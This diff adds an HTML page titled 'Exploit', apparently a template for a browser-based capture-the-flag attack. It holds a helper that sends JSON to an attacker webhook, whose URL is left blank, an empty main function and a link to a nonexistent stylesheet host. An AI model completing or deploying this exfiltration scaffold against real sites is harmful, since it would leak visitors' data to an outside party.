@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Exploit</title>
+    </head>
+    <body>
+        <script async>
+            async function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+
+            const WEBHOOK_URL = "";
+            
+            async function notifyWebhook(message) {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    mode: "no-cors",
+                    body: JSON.stringify({ message })
+                });
+                return response;
+            }
+            
+            async function main() {
+
+            }
+            main();
+        </script>
+        <link rel="stylesheet" href="https://doesnotexist.ahh.bet">
+    </body>
+</html>
